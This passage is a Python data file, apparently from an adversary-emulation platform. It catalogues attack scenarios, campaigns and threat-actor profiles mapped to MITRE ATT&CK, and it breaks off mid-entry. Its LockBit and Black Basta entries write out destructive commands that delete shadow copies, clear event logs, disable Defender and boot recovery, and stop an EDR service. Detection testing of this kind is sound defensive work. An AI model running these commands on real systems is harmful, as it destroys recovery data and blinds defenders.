# data.py — All scenarios, campaigns, and threat actors
# Direct port of src/lib/types.ts

SCENARIOS = [
    {
        "id": "recon-local",
        "name": "Host Reconnaissance (PowerShell)",
        "adversary": "Red Team Ops",
        "tactic": "Discovery",
        "description": "Enumerates local network connections and running processes to identify key assets.",
        "mitreTechniques": [
            {"id": "T1049", "name": "System Network Connections Discovery", "url": "https://attack.mitre.org/techniques/T1049/"},
            {"id": "T1057", "name": "Process Discovery", "url": "https://attack.mitre.org/techniques/T1057/"}
        ],
        "scriptPath": "scenarios/recon_local.ps1",
        "estimatedDuration": "2 mins",
        "difficulty": "Easy"
    },
    {
        "id": "priv-esc",
        "name": "Privilege Escalation Check",
        "adversary": "APT28",
        "tactic": "Privilege Escalation",
        "description": "Checks current privileges and simulates enabling SeDebugPrivilege.",
        "mitreTechniques": [
            {"id": "T1134", "name": "Access Token Manipulation", "url": "https://attack.mitre.org/techniques/T1134/"}
        ],
        "scriptPath": "scenarios/priv_esc.ps1",
        "estimatedDuration": "1 min",
        "difficulty": "Medium"
    },
    {
        "id": "lateral-dc",
        "name": "Lateral Movement to Domain Controller",
        "adversary": "APT28",
        "tactic": "Lateral Movement",
        "description": "Attempts to verify connectivity and simulate administrative share access to the Domain Controller via SMB.",
        "mitreTechniques": [
            {"id": "T1021.002", "name": "Remote Services: SMB", "url": "https://attack.mitre.org/techniques/T1021/002/"}
        ],
        "scriptPath": "scenarios/lateral_dc.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard"
    },
    {
        "id": "c2-check",
        "name": "C2 Connectivity Check",
        "adversary": "Scattered Spider",
        "tactic": "Command and Control",
        "description": "Verifies DNS resolution and TCP connectivity to the configured C2 infrastructure.",
        "mitreTechniques": [
            {"id": "T1071", "name": "Application Layer Protocol", "url": "https://attack.mitre.org/techniques/T1071/"}
        ],
        "scriptPath": "scenarios/c2_check.ps1",
        "estimatedDuration": "2 mins",
        "difficulty": "Easy"
    },
    {
        "id": "persistence-reg",
        "name": "Persistence (Registry)",
        "adversary": "APT1",
        "tactic": "Persistence",
        "description": "Creates a simulated malicious Run key in HKCU.",
        "mitreTechniques": [
            {"id": "T1547.001", "name": "Registry Run Keys", "url": "https://attack.mitre.org/techniques/T1547/001/"}
        ],
        "scriptPath": "scenarios/persistence.ps1",
        "estimatedDuration": "1 min",
        "difficulty": "Medium"
    },
    {
        "id": "defense-evasion",
        "name": "Defense Evasion (Clear Logs)",
        "adversary": "Red Team Ops",
        "tactic": "Defense Evasion",
        "description": "Simulates clearing the Security Event Log.",
        "mitreTechniques": [
            {"id": "T1070.001", "name": "Indicator Removal: Clear Windows Event Logs", "url": "https://attack.mitre.org/techniques/T1070/001/"}
        ],
        "scriptPath": "scenarios/defense_evasion.ps1",
        "estimatedDuration": "2 mins",
        "difficulty": "Medium"
    },
    {
        "id": "cred-dump",
        "name": "Credential Dumping (Active)",
        "adversary": "APT1",
        "tactic": "Credential Access",
        "description": "Simulates dumping LSASS memory using rundll32 and comsvcs.dll.",
        "mitreTechniques": [
            {"id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory", "url": "https://attack.mitre.org/techniques/T1003/001/"}
        ],
        "scriptPath": "scenarios/cred_dump.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Hard"
    },
    {
        "id": "initial-access",
        "name": "Initial Access (Payload Staging)",
        "adversary": "APT45",
        "tactic": "Initial Access",
        "description": "Simulates dropping a payload (output.wav) to C:\\temp for exfiltration.",
        "mitreTechniques": [
            {"id": "T1105", "name": "Ingress Tool Transfer", "url": "https://attack.mitre.org/techniques/T1105/"}
        ],
        "scriptPath": "scenarios/initial_access.ps1",
        "estimatedDuration": "1 min",
        "difficulty": "Easy"
    },
    {
        "id": "exfil-dns",
        "name": "Exfiltration via DNS",
        "adversary": "APT45",
        "tactic": "Exfiltration",
        "description": "Reads the staged payload and exfiltrates it via DNS A record queries.",
        "mitreTechniques": [
            {"id": "T1048.003", "name": "Exfiltration Over Alternative Protocol: DNS", "url": "https://attack.mitre.org/techniques/T1048/003/"}
        ],
        "scriptPath": "scenarios/exfil_dns.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Hard"
    },
    # WSL-Based Scenarios
    {
        "id": "wsl-recon",
        "name": "WSL Reconnaissance & Enumeration",
        "adversary": "Red Team Ops",
        "tactic": "Discovery",
        "description": "Executes Linux reconnaissance commands via WSL, accessing Windows filesystem through /mnt/c mount points.",
        "mitreTechniques": [
            {"id": "T1202", "name": "Indirect Command Execution", "url": "https://attack.mitre.org/techniques/T1202/"},
            {"id": "T1083", "name": "File and Directory Discovery", "url": "https://attack.mitre.org/techniques/T1083/"}
        ],
        "scriptPath": "scenarios/wsl/wsl_recon.ps1",
        "estimatedDuration": "2 mins",
        "difficulty": "Easy"
    },
    {
        "id": "wsl-defense-evasion",
        "name": "WSL Defense Evasion",
        "adversary": "Scattered Spider",
        "tactic": "Defense Evasion",
        "description": "Uses wsl.exe to execute commands, bypassing Windows command-line logging and security controls.",
        "mitreTechniques": [
            {"id": "T1202", "name": "Indirect Command Execution", "url": "https://attack.mitre.org/techniques/T1202/"},
            {"id": "T1027", "name": "Obfuscated Files or Information", "url": "https://attack.mitre.org/techniques/T1027/"}
        ],
        "scriptPath": "scenarios/wsl/wsl_defense_evasion.ps1",
        "estimatedDuration": "2 mins",
        "difficulty": "Medium"
    },
    {
        "id": "wsl-reverse-shell",
        "name": "WSL Reverse Shell",
        "adversary": "APT28",
        "tactic": "Execution",
        "description": "Establishes a reverse shell using bash and netcat from within WSL subsystem.",
        "mitreTechniques": [
            {"id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell", "url": "https://attack.mitre.org/techniques/T1059/004/"}
        ],
        "scriptPath": "scenarios/wsl/wsl_reverse_shell.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Hard"
    },
    {
        "id": "wsl-file-access",
        "name": "WSL File Access & Staging",
        "adversary": "APT1",
        "tactic": "Collection",
        "description": "Accesses and stages Windows files via WSL mount points for collection and exfiltration.",
        "mitreTechniques": [
            {"id": "T1005", "name": "Data from Local System", "url": "https://attack.mitre.org/techniques/T1005/"},
            {"id": "T1074.001", "name": "Data Staged: Local Data Staging", "url": "https://attack.mitre.org/techniques/T1074/001/"}
        ],
        "scriptPath": "scenarios/wsl/wsl_file_access.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Medium"
    },
    {
        "id": "wsl-persistence",
        "name": "WSL Persistence (Cron)",
        "adversary": "Wizard Spider",
        "tactic": "Persistence",
        "description": "Establishes persistence via cron jobs within WSL that execute when the subsystem is running.",
        "mitreTechniques": [
            {"id": "T1053.003", "name": "Scheduled Task/Job: Cron", "url": "https://attack.mitre.org/techniques/T1053/003/"}
        ],
        "scriptPath": "scenarios/wsl/wsl_persistence.ps1",
        "estimatedDuration": "2 mins",
        "difficulty": "Medium"
    },
    {
        "id": "wsl-exfil",
        "name": "WSL Exfiltration (curl/wget)",
        "adversary": "APT45",
        "tactic": "Exfiltration",
        "description": "Uses Linux tools (curl, wget, netcat) from WSL to exfiltrate data to C2 server.",
        "mitreTechniques": [
            {"id": "T1048", "name": "Exfiltration Over Alternative Protocol", "url": "https://attack.mitre.org/techniques/T1048/"},
            {"id": "T1567", "name": "Exfiltration Over Web Service", "url": "https://attack.mitre.org/techniques/T1567/"}
        ],
        "scriptPath": "scenarios/wsl/wsl_exfil.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Hard"
    },
    # LOLBin Download Chains
    {
        "id": "lolbin-certutil",
        "name": "LOLBin Download (certutil)",
        "adversary": "APT28",
        "tactic": "Defense Evasion",
        "description": "Uses certutil.exe to download offensive tools from C2 server, triggering LOLBin detection rules.",
        "mitreTechniques": [
            {"id": "T1105", "name": "Ingress Tool Transfer", "url": "https://attack.mitre.org/techniques/T1105/"},
            {"id": "T1140", "name": "Deobfuscate/Decode Files", "url": "https://attack.mitre.org/techniques/T1140/"}
        ],
        "scriptPath": "scenarios/lolbin/certutil_download.ps1",
        "estimatedDuration": "2 mins",
        "difficulty": "Easy"
    },
    {
        "id": "lolbin-bitsadmin",
        "name": "LOLBin Download (bitsadmin)",
        "adversary": "APT1",
        "tactic": "Defense Evasion",
        "description": "Creates BITS jobs to stealthily download tools from C2, disguised as Windows Update activity.",
        "mitreTechniques": [
            {"id": "T1197", "name": "BITS Jobs", "url": "https://attack.mitre.org/techniques/T1197/"},
            {"id": "T1105", "name": "Ingress Tool Transfer", "url": "https://attack.mitre.org/techniques/T1105/"}
        ],
        "scriptPath": "scenarios/lolbin/bitsadmin_download.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Medium"
    },
    {
        "id": "lolbin-mshta",
        "name": "LOLBin Execution (mshta)",
        "adversary": "Wizard Spider",
        "tactic": "Defense Evasion",
        "description": "Uses mshta.exe for signed binary proxy execution of HTA payloads with embedded VBScript.",
        "mitreTechniques": [
            {"id": "T1218.005", "name": "Signed Binary Proxy Execution: Mshta", "url": "https://attack.mitre.org/techniques/T1218/005/"}
        ],
        "scriptPath": "scenarios/lolbin/mshta_execute.ps1",
        "estimatedDuration": "2 mins",
        "difficulty": "Medium"
    },
    {
        "id": "lolbin-powershell-cradle",
        "name": "PowerShell Download Cradles",
        "adversary": "Scattered Spider",
        "tactic": "Execution",
        "description": "Demonstrates multiple PowerShell download methods: IWR, WebClient, DownloadString, and BITS Transfer.",
        "mitreTechniques": [
            {"id": "T1059.001", "name": "PowerShell", "url": "https://attack.mitre.org/techniques/T1059/001/"},
            {"id": "T1105", "name": "Ingress Tool Transfer", "url": "https://attack.mitre.org/techniques/T1105/"}
        ],
        "scriptPath": "scenarios/lolbin/powershell_download.ps1",
        "estimatedDuration": "2 mins",
        "difficulty": "Easy"
    },
    # Credential Access
    {
        "id": "cred-mimikatz",
        "name": "Mimikatz Credential Dump",
        "adversary": "APT28",
        "tactic": "Credential Access",
        "description": "Downloads and executes Mimikatz for sekurlsa::logonpasswords, lsadump::cache, and Kerberos ticket extraction.",
        "mitreTechniques": [
            {"id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory", "url": "https://attack.mitre.org/techniques/T1003/001/"},
            {"id": "T1003.003", "name": "OS Credential Dumping: NTDS", "url": "https://attack.mitre.org/techniques/T1003/003/"}
        ],
        "scriptPath": "scenarios/credential_access/mimikatz_dump.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard"
    },
    {
        "id": "cred-comsvcs-lsass",
        "name": "LSASS Dump (comsvcs.dll)",
        "adversary": "Red Team Ops",
        "tactic": "Credential Access",
        "description": "Uses native comsvcs.dll MiniDump via rundll32 to dump LSASS memory - no external tools required.",
        "mitreTechniques": [
            {"id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory", "url": "https://attack.mitre.org/techniques/T1003/001/"}
        ],
        "scriptPath": "scenarios/credential_access/comsvcs_lsass.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Medium"
    },
    {
        "id": "cred-sam-extract",
        "name": "SAM/SYSTEM Registry Extraction",
        "adversary": "APT1",
        "tactic": "Credential Access",
        "description": "Extracts SAM, SYSTEM, and SECURITY registry hives for offline credential cracking with secretsdump.",
        "mitreTechniques": [
            {"id": "T1003.002", "name": "OS Credential Dumping: SAM", "url": "https://attack.mitre.org/techniques/T1003/002/"}
        ],
        "scriptPath": "scenarios/credential_access/sam_extract.ps1",
        "estimatedDuration": "2 mins",
        "difficulty": "Medium"
    },
    {
        "id": "cred-procdump-lsass",
        "name": "LSASS Dump (Procdump)",
        "adversary": "APT45",
        "tactic": "Credential Access",
        "description": "Uses Microsoft-signed Sysinternals Procdump to create a full memory dump of LSASS process.",
        "mitreTechniques": [
            {"id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory", "url": "https://attack.mitre.org/techniques/T1003/001/"},
            {"id": "T1105", "name": "Ingress Tool Transfer", "url": "https://attack.mitre.org/techniques/T1105/"}
        ],
        "scriptPath": "scenarios/credential_access/procdump_lsass.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Hard"
    },
    # Lateral Movement
    {
        "id": "lateral-psexec",
        "name": "PsExec Remote Execution",
        "adversary": "APT28",
        "tactic": "Lateral Movement",
        "description": "Downloads PsExec and executes commands remotely via SMB service creation (PSEXESVC).",
        "mitreTechniques": [
            {"id": "T1569.002", "name": "System Services: Service Execution", "url": "https://attack.mitre.org/techniques/T1569/002/"},
            {"id": "T1021.002", "name": "Remote Services: SMB", "url": "https://attack.mitre.org/techniques/T1021/002/"}
        ],
        "scriptPath": "scenarios/lateral_movement/psexec_remote.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard"
    },
    {
        "id": "lateral-wmi",
        "name": "WMI Remote Execution",
        "adversary": "Red Team Ops",
        "tactic": "Lateral Movement",
        "description": "Uses native WMI for remote process creation and system enumeration - no external tools needed.",
        "mitreTechniques": [
            {"id": "T1047", "name": "Windows Management Instrumentation", "url": "https://attack.mitre.org/techniques/T1047/"}
        ],
        "scriptPath": "scenarios/lateral_movement/wmiexec_remote.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Medium"
    },
    {
        "id": "lateral-pth",
        "name": "Pass-the-Hash Attack",
        "adversary": "Scattered Spider",
        "tactic": "Lateral Movement",
        "description": "Uses Mimikatz sekurlsa::pth to authenticate with extracted NTLM hashes for lateral movement.",
        "mitreTechniques": [
            {"id": "T1550.002", "name": "Pass the Hash", "url": "https://attack.mitre.org/techniques/T1550/002/"},
            {"id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory", "url": "https://attack.mitre.org/techniques/T1003/001/"}
        ],
        "scriptPath": "scenarios/lateral_movement/pth_attack.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard"
    },
    {
        "id": "lateral-smb",
        "name": "SMB Admin Share Lateral",
        "adversary": "Wizard Spider",
        "tactic": "Lateral Movement",
        "description": "Accesses C$/ADMIN$ shares, copies payloads, and schedules remote execution via schtasks.",
        "mitreTechniques": [
            {"id": "T1021.002", "name": "Remote Services: SMB", "url": "https://attack.mitre.org/techniques/T1021/002/"},
            {"id": "T1570", "name": "Lateral Tool Transfer", "url": "https://attack.mitre.org/techniques/T1570/"},
            {"id": "T1053.005", "name": "Scheduled Task", "url": "https://attack.mitre.org/techniques/T1053/005/"}
        ],
        "scriptPath": "scenarios/lateral_movement/smb_lateral.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard"
    },
    # BYOVD - EDR Bypass
    {
        "id": "byovd-rtcore",
        "name": "BYOVD: RTCore64 EDR Kill",
        "adversary": "Wizard Spider",
        "tactic": "Defense Evasion",
        "description": "Loads vulnerable MSI Afterburner driver (CVE-2019-16098) for kernel-level EDR callback removal.",
        "mitreTechniques": [
            {"id": "T1562.001", "name": "Impair Defenses: Disable or Modify Tools", "url": "https://attack.mitre.org/techniques/T1562/001/"},
            {"id": "T1068", "name": "Exploitation for Privilege Escalation", "url": "https://attack.mitre.org/techniques/T1068/"}
        ],
        "scriptPath": "scenarios/byovd/byovd_rtcore.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard"
    },
    {
        "id": "byovd-dbutil",
        "name": "BYOVD: Dell dbutil Exploit",
        "adversary": "APT45",
        "tactic": "Defense Evasion",
        "description": "Uses Dell dbutil_2_3.sys (CVE-2021-21551) for kernel R/W - attributed to Lazarus APT group.",
        "mitreTechniques": [
            {"id": "T1562.001", "name": "Impair Defenses: Disable or Modify Tools", "url": "https://attack.mitre.org/techniques/T1562/001/"},
            {"id": "T1068", "name": "Exploitation for Privilege Escalation", "url": "https://attack.mitre.org/techniques/T1068/"}
        ],
        "scriptPath": "scenarios/byovd/byovd_dbutil.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard"
    },
    {
        "id": "byovd-terminator",
        "name": "Terminator EDR Kill",
        "adversary": "Scattered Spider",
        "tactic": "Defense Evasion",
        "description": "Uses Terminator BYOVD tool to enumerate and terminate EDR processes via signed kernel driver abuse.",
        "mitreTechniques": [
            {"id": "T1562.001", "name": "Impair Defenses: Disable or Modify Tools", "url": "https://attack.mitre.org/techniques/T1562/001/"},
            {"id": "T1518.001", "name": "Security Software Discovery", "url": "https://attack.mitre.org/techniques/T1518/001/"}
        ],
        "scriptPath": "scenarios/byovd/terminator_edr.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Hard"
    },
    {
        "id": "edr-process-kill",
        "name": "Multi-Method EDR Disable",
        "adversary": "Red Team Ops",
        "tactic": "Defense Evasion",
        "description": "Attempts to disable EDR via PowerShell, service stops, taskkill, registry, and AMSI bypass.",
        "mitreTechniques": [
            {"id": "T1562.001", "name": "Impair Defenses: Disable or Modify Tools", "url": "https://attack.mitre.org/techniques/T1562/001/"},
            {"id": "T1518.001", "name": "Security Software Discovery", "url": "https://attack.mitre.org/techniques/T1518/001/"}
        ],
        "scriptPath": "scenarios/byovd/edr_process_kill.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Medium"
    },
    # Identity Attacks
    {
        "id": "identity-dcsync",
        "name": "DCSync (Mimikatz)",
        "adversary": "APT28",
        "tactic": "Credential Access",
        "description": "Replicates password data from the Domain Controller using Directory Replication Service (DRS) via Mimikatz lsadump::dcsync.",
        "mitreTechniques": [
            {"id": "T1003.006", "name": "OS Credential Dumping: DCSync", "url": "https://attack.mitre.org/techniques/T1003/006/"}
        ],
        "scriptPath": "scenarios/identity_attacks/dcsync.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard"
    },
    {
        "id": "identity-kerberoast",
        "name": "Kerberoasting",
        "adversary": "Scattered Spider",
        "tactic": "Credential Access",
        "description": "Requests TGS tickets for accounts with SPNs and exports them for offline password cracking using native .NET and Rubeus.",
        "mitreTechniques": [
            {"id": "T1558.003", "name": "Steal or Forge Kerberos Tickets: Kerberoasting", "url": "https://attack.mitre.org/techniques/T1558/003/"}
        ],
        "scriptPath": "scenarios/identity_attacks/kerberoast.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Medium"
    },
    {
        "id": "identity-asrep-roast",
        "name": "AS-REP Roasting",
        "adversary": "Red Team Ops",
        "tactic": "Credential Access",
        "description": "Finds accounts with Kerberos preauthentication disabled and requests AS-REP hashes for offline cracking via Rubeus.",
        "mitreTechniques": [
            {"id": "T1558.004", "name": "Steal or Forge Kerberos Tickets: AS-REP Roasting", "url": "https://attack.mitre.org/techniques/T1558/004/"}
        ],
        "scriptPath": "scenarios/identity_attacks/asrep_roast.ps1",
        "estimatedDuration": "3 mins",
        "difficulty": "Medium"
    },
    {
        "id": "identity-golden-ticket",
        "name": "Golden Ticket Attack",
        "adversary": "APT28",
        "tactic": "Credential Access",
        "description": "Forges a TGT using the krbtgt NTLM hash via Mimikatz, granting unrestricted domain access. Includes automatic DCSync for hash extraction.",
        "mitreTechniques": [
            {"id": "T1558.001", "name": "Steal or Forge Kerberos Tickets: Golden Ticket", "url": "https://attack.mitre.org/techniques/T1558/001/"}
        ],
        "scriptPath": "scenarios/identity_attacks/golden_ticket.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard",
        "hasRevert": True,
        "revertScriptPath": "scenarios/identity_attacks/golden_ticket_revert.ps1",
        "inputParams": [{
            "name": "KrbtgtHash",
            "label": "krbtgt NTLM Hash (optional — will DCSync if blank)",
            "type": "text",
            "placeholder": "aad3b435b51404eeaad3b435b51404ee",
            "required": False
        }]
    },
    {
        "id": "identity-silver-ticket",
        "name": "Silver Ticket Attack",
        "adversary": "Scattered Spider",
        "tactic": "Credential Access",
        "description": "Forges a TGS for specific services (CIFS, HOST, HTTP) using a service account NTLM hash. More stealthy than Golden Ticket — never contacts the KDC.",
        "mitreTechniques": [
            {"id": "T1558.002", "name": "Steal or Forge Kerberos Tickets: Silver Ticket", "url": "https://attack.mitre.org/techniques/T1558/002/"}
        ],
        "scriptPath": "scenarios/identity_attacks/silver_ticket.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard",
        "inputParams": [{
            "name": "ServiceHash",
            "label": "Service Account NTLM Hash (optional — will DCSync if blank)",
            "type": "text",
            "placeholder": "aad3b435b51404eeaad3b435b51404ee",
            "required": False
        }]
    },
    {
        "id": "identity-diamond-ticket",
        "name": "Diamond Ticket Attack",
        "adversary": "Red Team Ops",
        "tactic": "Credential Access",
        "description": "Requests a legitimate TGT, decrypts and modifies its PAC data, then re-encrypts. Harder to detect than Golden Ticket because the ticket was legitimately issued.",
        "mitreTechniques": [
            {"id": "T1558.001", "name": "Steal or Forge Kerberos Tickets: Golden Ticket", "url": "https://attack.mitre.org/techniques/T1558/001/"}
        ],
        "scriptPath": "scenarios/identity_attacks/diamond_ticket.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard",
        "inputParams": [{
            "name": "KrbtgtHash",
            "label": "krbtgt Hash (AES256 or NTLM — optional)",
            "type": "text",
            "placeholder": "aes256 or ntlm hash",
            "required": False
        }]
    },
    {
        "id": "identity-impacket",
        "name": "Impacket Suite Execution",
        "adversary": "APT28",
        "tactic": "Lateral Movement",
        "description": "Downloads and executes Impacket standalone tools: secretsdump (DCSync), wmiexec, smbexec, psexec, and GetUserSPNs for remote execution and credential extraction.",
        "mitreTechniques": [
            {"id": "T1021.002", "name": "Remote Services: SMB", "url": "https://attack.mitre.org/techniques/T1021/002/"},
            {"id": "T1047", "name": "Windows Management Instrumentation", "url": "https://attack.mitre.org/techniques/T1047/"},
            {"id": "T1003.006", "name": "OS Credential Dumping: DCSync", "url": "https://attack.mitre.org/techniques/T1003/006/"}
        ],
        "scriptPath": "scenarios/identity_attacks/impacket_exec.ps1",
        "estimatedDuration": "5 mins",
        "difficulty": "Hard"
    }
]

CAMPAIGNS = [
    {
        "id": "full-killchain-campaign",
        "adversary": "Red Team Ops",
        "name": "Full Killchain Emulation",
        "description": "A complete end-to-end simulation from Initial Access to Exfiltration.",
        "steps": ["initial-access", "persistence-reg", "priv-esc", "defense-evasion", "lateral-dc", "c2-check", "exfil-dns"]
    },
    {
        "id": "apt28-campaign",
        "adversary": "APT28",
        "name": "Operation XAgent",
        "description": "Simulates a typical APT28 intrusion chain involving recon, privilege escalation, and lateral movement targeting high-value infrastructure.",
        "steps": ["recon-local", "priv-esc", "lateral-dc", "cred-dump"]
    },
    {
        "id": "apt1-campaign",
        "adversary": "APT1",
        "name": "Operation Comment Crew",
        "description": "A noise-heavy campaign focusing on persistence and credential harvesting.",
        "steps": ["recon-local", "persistence-reg", "cred-dump"]
    },
    {
        "id": "scattered-spider-campaign",
        "adversary": "Scattered Spider",
        "name": "Cloud & Identity Siege",
        "description": "Focuses on connecting to C2, evading defenses, and establishing persistence for long-term access.",
        "steps": ["c2-check", "defense-evasion", "persistence-reg", "priv-esc"]
    },
    {
        "id": "apt45-campaign",
        "adversary": "APT45",
        "name": "North Korean Info Stealer",
        "description": "Rapid collection of information and credentials.",
        "steps": ["recon-local", "defense-evasion", "cred-dump"]
    },
    {
        "id": "mustang-panda-campaign",
        "adversary": "Mustang Panda",
        "name": "PlugX Propagation",
        "description": "Lateral movement and C2 beaconing focus.",
        "steps": ["recon-local", "lateral-dc", "c2-check"]
    },
    {
        "id": "wizard-spider-campaign",
        "adversary": "Wizard Spider",
        "name": "Conti/Ryuk Precursor",
        "description": "The prelude to a ransomware attack: Recon, C2 verification, and spreading via SMB.",
        "steps": ["recon-local", "c2-check", "lateral-dc", "defense-evasion"]
    },
    {
        "id": "wsl-threat-campaign",
        "adversary": "Scattered Spider",
        "name": "WSL Subsystem Exploitation",
        "description": "Leverages Windows Subsystem for Linux to bypass security controls, establish persistence, and exfiltrate data using native Linux tooling.",
        "steps": ["wsl-recon", "wsl-defense-evasion", "wsl-file-access", "wsl-persistence", "wsl-exfil"]
    },
    {
        "id": "ransomware-precursor-campaign",
        "adversary": "Wizard Spider",
        "name": "Ransomware Precursor Chain",
        "description": "Full ransomware preparation chain: LOLBin tool staging, credential harvesting with Mimikatz, lateral movement via PsExec, and EDR termination via BYOVD.",
        "steps": ["lolbin-certutil", "cred-mimikatz", "lateral-psexec", "byovd-terminator"]
    },
    {
        "id": "apt-fullchain-campaign",
        "adversary": "APT28",
        "name": "APT Full Intrusion Chain",
        "description": "Sophisticated APT attack: stealthy BITS download, LSASS credential dump, WMI lateral movement, and kernel-level EDR bypass via vulnerable driver.",
        "steps": ["lolbin-bitsadmin", "cred-procdump-lsass", "lateral-wmi", "lateral-pth", "byovd-rtcore"]
    },
    {
        "id": "ad-identity-takeover-campaign",
        "adversary": "APT28",
        "name": "AD Identity Takeover",
        "description": "Full domain compromise chain: DCSync credential extraction, Golden Ticket forging for persistence, and Impacket-based remote execution across the domain.",
        "steps": ["identity-dcsync", "identity-golden-ticket", "identity-impacket"]
    },
    {
        "id": "kerberos-abuse-campaign",
        "adversary": "Scattered Spider",
        "name": "Kerberos Abuse Campaign",
        "description": "Comprehensive Kerberos attack chain: SPN enumeration and Kerberoasting, AS-REP Roasting for weak accounts, Silver Ticket for targeted service access, and Diamond Ticket for stealthy persistence.",
        "steps": ["identity-kerberoast", "identity-asrep-roast", "identity-silver-ticket", "identity-diamond-ticket"]
    }
]

THREAT_ACTORS = [
    {
        "id": "lockbit",
        "name": "LockBit 3.0",
        "aliases": ["LockBit Black"],
        "description": "One of the most prolific RaaS groups. LockBit 3.0 uses a modular ransomware payload and extensive living-off-the-land techniques.",
        "ttps": [
            {
                "id": "T1047",
                "technique": "Windows Management Instrumentation",
                "tactic": "Execution",
                "description": "Uses WMI to delete Volume Shadow Copies to prevent recovery.",
                "commandSnippet": "Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }",
                "scriptPath": "scenarios/lockbit/wmi_shadowcopy.ps1"
            },
            {
                "id": "T1070.001",
                "technique": "Indicator Removal: Clear Windows Event Logs",
                "tactic": "Defense Evasion",
                "description": "Clears security, system, and application logs to hide activity.",
                "commandSnippet": "wevtutil cl Security; wevtutil cl System; wevtutil cl Application",
                "scriptPath": "scenarios/lockbit/log_clear.ps1"
            },
            {
                "id": "T1112",
                "technique": "Modify Registry",
                "tactic": "Defense Evasion",
                "description": "Modifies registry to disable Windows Defender defenses.",
                "commandSnippet": "Set-MpPreference -DisableRealtimeMonitoring $true",
                "scriptPath": "scenarios/lockbit/disable_defender.ps1",
                "revertScriptPath": "scenarios/lockbit/disable_defender_revert.ps1"
            },
            {
                "id": "T1490",
                "technique": "Inhibit System Recovery",
                "tactic": "Impact",
                "description": "Disables boot recovery options using bcdedit.",
                "commandSnippet": "bcdedit /set {default} recoveryenabled No",
                "scriptPath": "scenarios/lockbit/bcdedit_recovery.ps1",
                "revertScriptPath": "scenarios/lockbit/bcdedit_recovery_revert.ps1"
            }
        ]
    },
    {
        "id": "generic-discovery",
        "name": "Generic Discovery Modules",
        "aliases": ["Red Team Ops", "Manual Recon"],
        "description": "Common discovery commands used by various threat actors to enumerate the environment.",
        "ttps": [
            {
                "id": "T1016",
                "technique": "System Network Configuration Discovery",
                "tactic": "Discovery",
                "description": "Enumerates network interfaces and IP configurations.",
                "commandSnippet": "ipconfig /all",
                "scriptPath": "scenarios/library/discovery_network.ps1"
            },
            {
                "id": "T1069",
                "technique": "Permission Groups Discovery",
                "tactic": "Discovery",
                "description": "Enumerates domain groups and members.",
                "commandSnippet": 'net group /domain "Domain Admins"',
                "scriptPath": "scenarios/library/discovery_groups.ps1"
            },
            {
                "id": "T1033",
                "technique": "System Owner/User Discovery",
                "tactic": "Discovery",
                "description": "Identifies the current user context.",
                "commandSnippet": "whoami /all",
                "scriptPath": "scenarios/library/discovery_user.ps1"
            },
            {
                "id": "T1087",
                "technique": "Account Discovery",
                "tactic": "Discovery",
                "description": "Enumerates all users in the domain.",
                "commandSnippet": "Get-ADUser -Filter * | Select-Object Name,SamAccountName",
                "scriptPath": "scenarios/library/discovery_ad_users.ps1"
            }
        ]
    },
    {
        "id": "blackbasta",
        "name": "Black Basta",
        "aliases": ["Black Basta Syndicate"],
        "description": "Emerged in 2022 as a potent RaaS. Known for spearphishing, Qakbot distribution, and using Backstab to disable EDR.",
        "ttps": [
            {
                "id": "T1566",
                "technique": "Phishing",
                "tactic": "Initial Access",
                "description": "Uses spearphishing emails with malicious ZIP attachments.",
                "commandSnippet": "# Simulated phishing delivery",
                "scriptPath": "scenarios/blackbasta/phishing_sim.ps1"
            },
            {
                "id": "T1562.001",
                "technique": "Impair Defenses: Disable or Modify Tools",
                "tactic": "Defense Evasion",
                "description": "Uses Backstab tool to disable EDR products.",
                "commandSnippet": 'Stop-Service -Name "Sense" -Force',
                "scriptPath": "scenarios/blackbasta/disable_edr.ps1",
                "revertScriptPath": "scenarios/blackbasta/disable_edr_revert.ps1"
            },
            {
                "id": "T1068",
                "technique": "Exploitation for Privilege Escalation",
                "tactic": "Privilege Escalation",
                "description": "Uses exploits like Zerologon, NoPac, PrintNightmare.",
                "commandSnippet": "# Invoke-ZeroLogon simulation",
                "scriptPath": "scenarios/blackbasta/priv_esc_exploit.ps1"
            },
            {
                "id": "T1021.001",
                "technique": "Remote Services: RDP",
                "tactic": "Lateral Movement",
                "description": "Uses valid accounts for RDP access.",
                "commandSnippet": "mstsc /v:<TARGET_IP>",
                "scriptPath": "scenarios/blackbasta/rdp_lateral.ps1",
                "inputParams": [{
                    "name": "TargetIP",
                    "label": "Target IP Address",
                    "type": "ip",
                    "placeholder": "10.0.0.1",
                    "required": True
                }]
            }
        ]
    },
    {
        "id": "alphv",
        "name": "ALPHV / BlackCat",
        "aliases": ["ALPHV", "BlackCat", "Noberus"],
        "description": "First major ransomware written in Rust. Highly customizable with multiple extortion methods.",
        "ttps": [
            {
                "id": "T1078",
                "technique": "Valid Accounts",
                "tactic": "Initial Access",
                "description": "Uses ProxyShell vulnerabilities for initial access.",
